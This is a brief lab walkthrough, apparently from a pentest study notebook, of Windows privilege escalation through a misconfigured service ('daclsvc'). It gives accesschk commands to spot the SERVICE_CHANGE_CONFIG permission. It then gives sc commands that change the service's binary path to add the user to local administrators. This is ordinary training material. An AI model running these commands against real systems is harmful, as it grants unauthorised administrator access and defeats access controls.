#Windows #PrivEsc #BinaryPaths #sc #Accesschk #PowerUp 
==common PrivEsc!==
## **Detection**

Windows VM

1. Open command prompt and type: 
	`C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *`
	`C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc`
		- Based on first result, we run it for `daclsvc`
		- We can also see this in `PowerUp.ps1` results
1. Notice that the output suggests that the user “`User-PC\User`” has the “`SERVICE_CHANGE_CONFIG`” permission.

## **Exploitation**

Windows VM

- Query service with: `sc qc daclsvc`
1. In command prompt type: `sc config daclsvc binpath= "net localgroup administrators user /add"`
2. In command prompt type: `sc start daclsvc`
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
